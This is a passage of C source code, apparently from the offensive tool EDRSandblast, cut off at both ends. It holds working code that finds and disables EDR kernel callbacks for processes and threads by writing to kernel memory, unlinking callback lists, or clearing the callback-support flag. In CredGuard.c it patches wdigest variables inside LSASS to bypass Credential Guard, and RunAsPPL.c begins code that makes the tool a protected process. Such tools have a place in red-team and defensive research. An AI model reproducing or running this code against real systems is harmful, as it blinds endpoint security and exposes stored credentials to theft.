    {.name = TEXT("Thread"), .offset = 0},
};

/*
* Get symbols from Internet that are not in the NtoskrnlOffsets structure (for experimental functions only)
*/
void GetAdditionnalObjectCallbackOffsets() {
    if (Offset__OBJECT_TYPE_Name) {
        //Symbols and offsets already loaded
        return;
    }
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(GetNtoskrnlPath());
    if (sym_ctx == NULL) {
        _tprintf_or_not(TEXT("Symbols not downloaded, aborting..."));
        exit(1);
    }
    GET_OFFSET(_OBJECT_TYPE, Name);
    GET_OFFSET(_OBJECT_TYPE, TotalNumberOfObjects);
    GET_OFFSET(_OBJECT_TYPE, TypeInfo);
    GET_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
    GET_SYMBOL(ObpObjectTypes);
    GET_SYMBOL(ObpTypeObjectType);

    UnloadSymbols(sym_ctx, FALSE);
}


/*
* ------- Callback Entry Undocumented structure strategy --------
* The following functions use the fact that the CallbackList of an _OBJECT_TYPE contains a list of _CALLBACK_ENTRY_ITEM elements, _CALLBACK_ENTRY_ITEM being the unofficial name
* of an undocumented structure.
* The struct has been reversed engineered in various ntoskrnl.exe version and seems constant from Windows 10 version 10240 to 22000 (oldest to most recent versions)
*/

/*
* Experimental : enumerates all object types on Windows, and checks if some callbacks are defined, even if not officially supported
*/
void EnumAllObjectsCallbacks() {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    GetAdditionnalObjectCallbackOffsets();

    //get object types count
    DWORD64 ObjectTypeType = ReadKernelMemoryDWORD64(Sym_ObpTypeObjectType);
    DWORD ObjectTypesCount = ReadMemoryDWORD(ObjectTypeType + Offset__OBJECT_TYPE_TotalNumberOfObjects);

    for (DWORD i = 0; i < ObjectTypesCount; i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(Sym_ObpObjectTypes + i * sizeof(DWORD64));
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;
        WORD ObjectType_Name_Length = ReadMemoryWORD(ObjectType + Offset__OBJECT_TYPE_Name + offsetof(UNICODE_STRING, Length));
        DWORD64 ObjectType_Name_Buffer = ReadMemoryDWORD64(ObjectType + Offset__OBJECT_TYPE_Name + offsetof(UNICODE_STRING, Buffer));
        WCHAR typeName[256] = { 0 };
        ReadMemory(ObjectType_Name_Buffer, typeName, ObjectType_Name_Length);
        wprintf_or_not(L"Object type : %s\n", typeName);

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry)) {
            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
            if (ObjectTypeField != ObjectType) {
                _putts_or_not(TEXT("Unexpected value in callback entry (ObjectTypeField), exiting..."));
                exit(1);
            }
            BOOL Enabled = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled);
            if (Enabled == FALSE) {
                continue;
            }
            if (Enabled != TRUE) {
                _putts_or_not(TEXT("Unexpected value in callback entry (Enabled), exiting..."));
                exit(1);
            }
            OB_OPERATION Operations = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Operations);
            _tprintf_or_not(TEXT("Callback for handle %s%s%s\n"),
                Operations & 1 ? TEXT("creations") : TEXT(""),
                Operations == 3 ? TEXT(" & ") : TEXT(""),
                Operations & 2 ? TEXT("duplications") : TEXT(""));
            DWORD64 PreOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PreOperation);
            DWORD64 PostOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PostOperation);
            DWORD64 driverOffsetPreOperation = 0;
            DWORD64 driverOffsetPostOperation = 0;
            TCHAR* driverNamePreOperation = FindDriverName(PreOperation, &driverOffsetPreOperation);
            TCHAR* driverNamePostOperation = FindDriverName(PostOperation, &driverOffsetPostOperation);
            _tprintf_or_not(TEXT("\tPreoperation at %llx [%s + %llx])\n"), PreOperation, driverNamePreOperation, driverOffsetPreOperation);
            _tprintf_or_not(TEXT("\tPostoperation at %llx [%s + %llx]\n"), PostOperation, driverNamePostOperation, driverOffsetPostOperation);
        }
        _putts_or_not(TEXT(""));

    }
}

/*
* Enumerate all callbacks set on Process & Thread handle manipulation
* WARNING : depends on undocumented structures, but is able to differentiate EDR-related callbacks from potentially legitimate ones
*/
BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return FALSE;
    }
    BOOL found = FALSE;
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;

    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tEnumerating %s object callbacks : \n"), ObjectTypesSubjectToCallback[i].name);
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry)) {
            if (FoundObjectCallbacks->index >= 256) {
                _putts_or_not(TEXT("[!] No more space to store object callbacks !!! This should not happen. Exiting..."));
                exit(1);
            }
            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
            if (ObjectTypeField != ObjectType) {
                _putts_or_not(TEXT("Unexpected value in callback entry (ObjectTypeField), exiting..."));
                exit(1);
            }
            DWORD Operations = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Operations);
            TCHAR* OperationsString;
            switch (Operations) {
            case 1: // OB_OPERATION_HANDLE_CREATE
                OperationsString = TEXT("creations");
                break;
            case 2: // OB_OPERATION_HANDLE_DUPLICATE
                OperationsString = TEXT("duplications");
                break;
            case 3: // OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE 
                OperationsString = TEXT("creations & duplications");
                break;
            default:
                _putts_or_not(TEXT("Unexpected value in callback entry (Operations), exiting..."));
                exit(1);
            }
            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\tCallback at %p for handle %s:\n"), (PVOID)cbEntry, OperationsString);
            BOOL Enabled = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled);
            if (Enabled != FALSE && Enabled != TRUE) {
                _putts_or_not(TEXT("Unexpected value in callback entry (Enabled), exiting..."));
                exit(1);
            }
            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tStatus: %s\n"), Enabled ? TEXT("Enabled") : TEXT("Disabled"));
            DWORD64 PreOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PreOperation);
            if (PreOperation) {
                DWORD64 driverOffset;
                TCHAR* driverNamePreOperation = FindDriverName(PreOperation, &driverOffset);
                _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tPreoperation at 0x%016llx [%s + 0x%llx]\n"), PreOperation, driverNamePreOperation, driverOffset);
                if (isDriverNameMatchingEDR(driverNamePreOperation)) {
                    _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
                    if (Enabled) {
                        _putts_or_not(TEXT("and is enabled!"));
                        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
                        cb->type = OBJECT_CALLBACK;
                        cb->driver_name = driverNamePreOperation;
                        cb->removed = FALSE;
                        cb->callback_func = PreOperation;
                        cb->addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
                        FoundObjectCallbacks->index++;
                        found |= TRUE;
                    }
                    else {
                        _putts_or_not(TEXT("but is disabled."));

                    }
                }
            }
            DWORD64 PostOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PostOperation);
            if (PostOperation) {
                DWORD64 driverOffset;
                TCHAR* driverNamePostOperation = FindDriverName(PostOperation, &driverOffset);
                _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tPostoperation at 0x%016llx [%s + 0x%llx]\n"), PostOperation, driverNamePostOperation, driverOffset);
                if (Enabled && isDriverNameMatchingEDR(driverNamePostOperation)) {
                    _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
                    if (Enabled) {
                        _putts_or_not(TEXT("and is enabled!"));
                        if (FoundObjectCallbacks->index != 0 &&
                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index - 1].addresses.object_callback.enable_addr == cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled) {
                            //skip if last callback function belong to the same callback entry (preoperation)
                            continue;
                        }
                        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
                        cb->type = OBJECT_CALLBACK;
                        cb->driver_name = driverNamePostOperation;
                        cb->removed = FALSE;
                        cb->callback_func = PostOperation;
                        cb->addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
                        FoundObjectCallbacks->index++;
                        found |= TRUE;
                    }
                    else {
                        _putts_or_not(TEXT("but is disabled."));
                    }
                }
            }
        }
    }
    return found;
}


void EnableDisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks, BOOL enable) {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    for (DWORD64 i = 0; i < FoundObjectCallbacks->index; i++) {
        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[i];
        if (cb->type == OBJECT_CALLBACK && cb->removed == enable) {
            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t%s %s callback...\n"), enable ? TEXT("Enabling") : TEXT("Disabling"), cb->driver_name);
            WriteMemoryDWORD(cb->addresses.object_callback.enable_addr, enable ? TRUE : FALSE);
            cb->removed = !cb->removed;
        }
    }
}

void DisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
    EnableDisableEDRProcessAndThreadObjectsCallbacks(FoundObjectCallbacks, FALSE);
}

void EnableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
    EnableDisableEDRProcessAndThreadObjectsCallbacks(FoundObjectCallbacks, TRUE);
}

void EnableDisableAllProcessAndThreadObjectsCallbacks(BOOL enable) {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry)) {
            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
            if (ObjectTypeField != ObjectType) {
                _putts_or_not(TEXT("Unexpected value in callback entry, exiting..."));
                exit(1);
            }
            WriteMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled, enable ? TRUE : FALSE);
        }
    }
}


/*
* ------- CallbackList unlinking strategy --------
* The following functions use the fact that the CallbackList of an _OBJECT_TYPE can be emptied by making it point to itself
* However, if the kernel memory write primitive used to overwrite a pointer is not "atomic" (e.g. the RTCore64 driver's writes 2 DWORDs successively), there
* is a high risk of race condition where the CallbackList is used by the system while one of its pointers is only partial overwritten (thus invalid), which
* is likely to result in a crash.
* Handle creation/duplication for processes and threads being very frequent, this strategy is thus risky in some cases.
*/

/*
* Count callbacks set on Process & Thread handle manipulation, but is unnable to differentiate EDR-related callbacks from potentially legitimate ones
* Depends only on documented symbols
*/
SIZE_T CountProcessAndThreadObjectsCallbacks() {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return 0;
    }
    SIZE_T nbCallbacks = 0;
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Flink));
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry + offsetof(LIST_ENTRY, Flink))) {
            nbCallbacks++;
            ObjectTypesSubjectToCallback[i].nbCallbacks++;
        }
        _tprintf_or_not(TEXT("Counting %llu registered callbacks for %s\n"), ObjectTypesSubjectToCallback[i].nbCallbacks, ObjectTypesSubjectToCallback[i].name);
    }

    return nbCallbacks;
}

/*
* Unlink all process and thread handle callbacks (EDR related or not)
* (no critical system component should be in these list anyway)
*/
void RemoveAllProcessAndThreadObjectsCallbacks() {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        if (ObjectTypesSubjectToCallback[i].nbCallbacks) {
            DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
            DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;
            ObjectTypesSubjectToCallback[i].callbackListAddress = ObjectType_Callbacks_List;

            ObjectTypesSubjectToCallback[i].callbackListFlinkBackup = ReadMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Flink));
            ObjectTypesSubjectToCallback[i].callbackListBlinkBackup = ReadMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Blink));
            WriteMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Flink), ObjectType_Callbacks_List);
            WriteMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Blink), ObjectType_Callbacks_List);
            _tprintf_or_not(TEXT("Unlinked the callback entries for %s\n"), ObjectTypesSubjectToCallback[i].name);
        }

    }
    _putts_or_not(TEXT(""));
}

/*
* Re-link all process and thread handle callbacks that were unlinked
*/
void RestoreAllProcessAndThreadObjectsCallbacks() {
    GetAdditionnalObjectCallbackOffsets();
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;

    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        if (ObjectTypesSubjectToCallback[i].callbackListAddress && ObjectTypesSubjectToCallback[i].nbCallbacks) {
            DWORD64 callbackListAddress = ObjectTypesSubjectToCallback[i].callbackListAddress;
            WriteMemoryDWORD64(callbackListAddress + offsetof(LIST_ENTRY, Flink), ObjectTypesSubjectToCallback[i].callbackListFlinkBackup);
            WriteMemoryDWORD64(callbackListAddress + offsetof(LIST_ENTRY, Blink), ObjectTypesSubjectToCallback[i].callbackListBlinkBackup);
            _tprintf_or_not(TEXT("Re-linked the original callback entries for %s\n"), ObjectTypesSubjectToCallback[i].name);
        }
    }
    _putts_or_not(TEXT(""));
}

/*
* ------- CallbackList unlinking strategy END --------
*/


/*
* ------- SupportCallbacks bit strategy --------
*/
/*
* Enables/Disables Callback support for processes and threads entirely. The "SupportsObjectCallbacks" field of _OBJECT_TYPE being checked by ObpCreateHandle before checking if CallbackList
* is not empty (and before listing & calling the callbacks). No callback support, no callbacks.
* WARNING : This flag is actually checked by PatchGuard ! There is a risk that PatchGuard will notice a change, even if temporary, and cause a BSOD.
*/
void EnableDisableProcessAndThreadObjectsCallbacksSupport(BOOL enable) {
    GetAdditionnalObjectCallbackOffsets();

    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;

    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_TypeInfo = ObjectType + Offset__OBJECT_TYPE_TypeInfo;
        WORD TypeInfo_ObjectTypeFlags = ReadMemoryWORD(ObjectType_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags);
        if (enable) {
            TypeInfo_ObjectTypeFlags |= SupportsObjectCallbacks_bit;
        }
        else {
            TypeInfo_ObjectTypeFlags &= ~SupportsObjectCallbacks_bit;
        }
        WriteMemoryWORD(ObjectType_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags, TypeInfo_ObjectTypeFlags);
        _tprintf_or_not(TEXT("[+] Callback support for %s has been %s\n"), ObjectTypesSubjectToCallback[i].name, enable ? TEXT("enabled") : TEXT("disabled"));

    }
    _putts_or_not(TEXT(""));
}

BOOL AreObjectsCallbacksSupportEnabled(struct ObjTypeSubjectToCallback objTypSubjCb) {
    GetAdditionnalObjectCallbackOffsets();

    DWORD64 ObjectType = ReadKernelMemoryDWORD64(objTypSubjCb.offset);
    DWORD64 ObjectType_TypeInfo = ObjectType + Offset__OBJECT_TYPE_TypeInfo;
    WORD TypeInfo_ObjectTypeFlags = ReadMemoryWORD(ObjectType_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags);
    BOOL enable = (TypeInfo_ObjectTypeFlags & SupportsObjectCallbacks_bit) != 0;
    _tprintf_or_not(TEXT("[+] Callback support for %s is %s\n"), objTypSubjCb.name, enable ? TEXT("enabled") : TEXT("disabled"));

    return enable;
}

BOOL AreProcessAndThreadsObjectsCallbacksSupportEnabled() {
    BOOL enabled = FALSE;
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        enabled |= AreObjectsCallbacksSupportEnabled(ObjectTypesSubjectToCallback[i]);
    }
    return enabled;
}
/*
* ------- SupportCallbacks bit strategy --------
*/

```

`EDRSandblast/LSASSProtectionBypass/CredGuard.c`:

```c
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <Tchar.h>

#include "../EDRSandblast.h"
#include "WdigestOffsets.h"

DWORD WINAPI disableCredGuardByPatchingLSASS(void) {
    HANDLE hProcessSnap;
    HANDLE hLsass;
    PROCESSENTRY32 pe32;
    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);
    pe32.th32ProcessID = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _putts_or_not(TEXT("[!] Cred Guard bypass failed: impossible to get snapshot of the system's processes (CreateToolhelp32Snapshot)"));
        return 1;
    }

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32)) {
        _putts_or_not(TEXT("[!] Cred Guard bypass failed: obtained invalid process handle")); // show cause of failure
        CloseHandle(hProcessSnap);          // clean the snapshot object
        return 1;
    }

    // Now walk the snapshot of processes, and look for "lsass.exe"
    do {
        if (_tcscmp(pe32.szExeFile, TEXT("lsass.exe")) == 0) {
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);

    if (_tcscmp(pe32.szExeFile, TEXT("lsass.exe")) != 0 || pe32.th32ProcessID == 0) {
        _putts_or_not(TEXT("[!] Cred Guard bypass failed: coudln't find LSASS process"));
        return 1;
    }

    // Open an handle to the LSASS process.
    hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
    if (hLsass == NULL || hLsass == INVALID_HANDLE_VALUE) {
        _tprintf_or_not(TEXT("[!] Cred Guard bypass failed: couldn't open lsass memory (OpenProcess, error code 0x%lx)\n"), GetLastError());
        return 1;
    }

    HMODULE hModulesArray[512] = { 0 };
    DWORD lpcbNeeded;
    if (!EnumProcessModules(hLsass, hModulesArray, sizeof(hModulesArray), &lpcbNeeded)) {
        _tprintf_or_not(TEXT("[!] Cred Guard bypass failed: couldn't enumerate lsass loaded modules (EnumProcessModules, error code 0x%lx)\n"), GetLastError());
        CloseHandle(hLsass);
        return 1;
    }

    BOOL returnStatus = FALSE;
    TCHAR szModulename[MAX_PATH];
    for (DWORD i = 0; i < (lpcbNeeded / sizeof(HMODULE)); i++) {
        if (hModulesArray[i] && !GetModuleFileNameEx(hLsass, hModulesArray[i], szModulename, _countof(szModulename))) {
            _tprintf_or_not(TEXT("[!] Cred Guard bypass non fatal error: couldn't get module name for module at index 0x%lx (GetModuleFileNameEx, error code 0x%lx)\n"), i, GetLastError());
            continue;
        }

        if (_tcsstr(szModulename, TEXT("wdigest"))) {
            MODULEINFO moduleInfo = { 0 };
            if (hModulesArray[i] && !GetModuleInformation(hLsass, hModulesArray[i], &moduleInfo, sizeof(MODULEINFO))) {
                _tprintf_or_not(TEXT("[!] Cred Guard bypass non fatal error: couldn't get module information for module at index 0x%lx (GetModuleInformation, error code 0x%lx)\n"), i, GetLastError());
                continue;
            }

            // Computes the exact address in memory of g_fParameter_UseLogonCredential & g_IsCredGuardEnabled using load lib wdigest base address + known offsets.
            DWORD64 wdigestBaseAddress = (DWORD64)moduleInfo.lpBaseOfDll;

            DWORD currentValue = 0x0;
            DWORD CurrentValueLength = sizeof(DWORD);
            SIZE_T bytesRead = 0;
            SIZE_T bytesWritten = 0;

            /*
            * Setting g_fParameter_UseLogonCredential to 0x1.
            * First attempt to read the current value and, if the read was successfull patch the g_fParameter_UseLogonCredential to bypass Cred Guard.
            */
            DWORD64 useLogonCredentialAddress = wdigestBaseAddress + g_wdigestOffsets.st.g_fParameter_UseLogonCredential;
            DWORD useLogonCredentialPatch = 0x1;
            _tprintf_or_not(TEXT("[*] Attempting to patch wdigest's g_fParameter_UseLogonCredential at 0x%I64x\n"), useLogonCredentialAddress);
            //if (ReadProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, &dwCurrent, dwCurrentLength, &bytesRead))
            if (ReadProcessMemory(hLsass, (PVOID)useLogonCredentialAddress, &currentValue, CurrentValueLength, &bytesRead)) {
                _tprintf_or_not(TEXT("[+] Found wdigest's g_fParameter_UseLogonCredential with a current value of 0x%lx\n"), currentValue);
            }
            else {
                _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: couldn't retrieve wdigest's g_fParameter_UseLogonCredential value (ReadProcessMemory, error code 0x%lx). An overwrite will not be attempted.\n"), GetLastError());
                break;
            }
            if (currentValue != useLogonCredentialPatch) {
                if (WriteProcessMemory(hLsass, (PVOID)useLogonCredentialAddress, (PVOID)&useLogonCredentialPatch, sizeof(DWORD), &bytesWritten)) {
                    ReadProcessMemory(hLsass, (PVOID)useLogonCredentialAddress, &currentValue, CurrentValueLength, &bytesRead);
                    if (currentValue == useLogonCredentialPatch) {
                        _tprintf_or_not(TEXT("[+] Successfully overwrote wdigest's g_fParameter_UseLogonCredential value to 0x%lx\n"), currentValue);
                    }
                    else {
                        _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: unsuccessful overwrite of wdigest's g_fParameter_UseLogonCredential value (current value 0x%lx instead of 0x%lx)\n"), currentValue, useLogonCredentialPatch);
                    }
                }
                else {
                    _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: an error occurred will attempting to overwrite wdigest's g_fParameter_UseLogonCredential value (WriteProcessMemory, error code 0x%lx)\n"), GetLastError());
                    break;
                }
            }
            else {
                _putts_or_not(TEXT("[+] wdigest's g_fParameter_UseLogonCredential is already patched!"));
            }
            _putts_or_not(TEXT("\n"));

            /*
            * Setting g_IsCredGuardEnabled to 0x0.
            * Needs to temporary set the memory page of g_IsCredGuardEnabled to PAGE_READWRITE to conduct the patch.
            * First attempt to read the current value and, if the read was successfull patch the g_fParameter_UseLogonCredential to bypass Cred Guard.
            */
            DWORD64 credGuardEnabledAddress = wdigestBaseAddress + g_wdigestOffsets.st.g_IsCredGuardEnabled;
            DWORD isCredGuardEnabledPatch = 0x0;
            currentValue = 0x0;
            bytesRead = 0;
            bytesWritten = 0;
            DWORD oldMemoryProtection = 0x0;
            _tprintf_or_not(TEXT("[*] Attempting to patch wdigest's g_IsCredGuardEnabled at 0x%I64x\n"), credGuardEnabledAddress);
            _putts_or_not(TEXT("[*] Attempting to set wdigest's g_IsCredGuardEnabled memory protection as PAGE_READWRITE"));
            if (!VirtualProtectEx(hLsass, (PVOID)credGuardEnabledAddress, sizeof(DWORD), PAGE_READWRITE, &oldMemoryProtection)) {
                _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: Failed to set wdigest's g_IsCredGuardEnabled memory protection to PAGE_READWRITE (VirtualProtectEx, error code 0x%lx)\n"), GetLastError());
                break;
            }
            if (ReadProcessMemory(hLsass, (PVOID)credGuardEnabledAddress, &currentValue, CurrentValueLength, &bytesRead)) {
                _tprintf_or_not(TEXT("[+] Found wdigest's g_IsCredGuardEnabled with a current value of 0x%lx\n"), currentValue);
            }
            else {
                _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: couldn't retrieve wdigest's g_IsCredGuardEnabled value (ReadProcessMemory, error code 0x%lx). An overwrite will not be attempted.\n"), GetLastError());
                break;
            }
            if (currentValue != isCredGuardEnabledPatch) {
                if (WriteProcessMemory(hLsass, (PVOID)credGuardEnabledAddress, (PVOID)&isCredGuardEnabledPatch, sizeof(DWORD), &bytesWritten)) {
                    ReadProcessMemory(hLsass, (PVOID)credGuardEnabledAddress, &currentValue, CurrentValueLength, &bytesRead);
                    if (currentValue == isCredGuardEnabledPatch) {
                        _tprintf_or_not(TEXT("[+] Successfully overwrote wdigest's g_IsCredGuardEnabled value to 0x%lx\n"), currentValue);
                    }
                    else {
                        _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: unsuccessful overwrite of wdigest's g_IsCredGuardEnabled value (current value 0x%lx instead of 0x%lx)\n"), currentValue, isCredGuardEnabledPatch);
                    }
                }
                else {
                    _tprintf_or_not(TEXT("[!] Cred Guard bypass fatal error: an error occurred will attempting to overwrite wdigest's g_IsCredGuardEnabled value (WriteProcessMemory, error code 0x%lx)\n"), GetLastError());
                    break;
                }
            }
            else {
                _putts_or_not(TEXT("[+] wdigest's g_IsCredGuardEnabled is already patched!"));
            }
            DWORD newMemoryProtection = 0x0;
            if (!VirtualProtectEx(hLsass, (PVOID)credGuardEnabledAddress, sizeof(DWORD), oldMemoryProtection, &newMemoryProtection)) {
                _tprintf_or_not(TEXT("[!] Cred Guard bypass non fatal error: Failed to restore wdigest's g_IsCredGuardEnabled memory protection to its original value (VirtualProtectEx, error code 0x%lx)\n"), GetLastError());
            }
            else {
                _putts_or_not(TEXT("[+] Successfully restored wdigest's g_IsCredGuardEnabled memory protection to its original value"));
            }
            _putts_or_not(TEXT("\n"));

            returnStatus = TRUE;

        }
    }
    CloseHandle(hLsass);

    return returnStatus;
}

```

`EDRSandblast/LSASSProtectionBypass/RunAsPPL.c`:

```c
/*

--- Functions to set the current process as a Protected Process (PsProtectedSignerWinTcb-Light).
--- The code to locate the EPROCESS structure is adapted from:
    http://blog.rewolf.pl/blog/?p=1683
*/
#include <tchar.h>

#include "../EDRSandblast.h"
#include "KernelMemoryPrimitives.h"
#include "NtoskrnlOffsets.h"
#include "Undoc.h"
#include "RunAsPPL.h"

DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
    NTSTATUS status;
    DWORD currentProcessID = GetCurrentProcessId();

    // Open an handle to our own process.
    HANDLE selfProcessHandle = OpenProcess(SYNCHRONIZE, FALSE, currentProcessID);
    if (verbose) {
        _tprintf_or_not(TEXT("[*] [ProcessProtection] Self process handle: 0x%hx\n"), (USHORT)((ULONG_PTR)selfProcessHandle));
    }


    // Retrieves the native NtQuerySystemInformation function from ntdll.
    HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
    if (!hNtdll) {
